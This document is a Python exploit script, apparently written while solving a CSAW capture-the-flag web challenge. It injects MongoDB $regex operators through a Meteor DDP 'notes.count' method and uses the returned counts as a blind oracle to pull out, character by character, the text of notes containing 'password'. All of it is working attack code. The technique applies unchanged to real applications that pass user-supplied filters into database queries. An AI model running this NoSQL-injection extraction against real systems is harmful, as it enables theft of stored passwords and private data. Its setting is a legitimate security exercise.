import json
import re
from ddp import DDP

d = DDP("ws://web.chal.csaw.io:5000/websocket")

def count(filter):
    res = d.call("notes.count", [filter])
    if res and "result" in res:
        return res["result"]
    return None

def extract_from_start(prefix_filter, max_len=300):
    body = ""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^&*()+=[]:;,.?/ \n\t'\"<>|~`"
    for i in range(max_len):
        found = False
        for c in chars:
            esc = re.escape(c)
            test = body + esc
            f = {"$and": [prefix_filter, {"body": {"$regex": "^" + test}}]}
            if count(f) and count(f) > 0:
                body += c
                found = True
                break
        if not found:
            break
        print(repr(body))
    return body

# Extract notes with "password"
print("=== password notes ===")
pw_filter = {"body": {"$regex": "password", "$options": "i"}}
# There are 2 notes. Let's extract the first one
body = extract_from_start(pw_filter, max_len=300)
print("FINAL password:", repr(body))

d.close()
end_of_edit

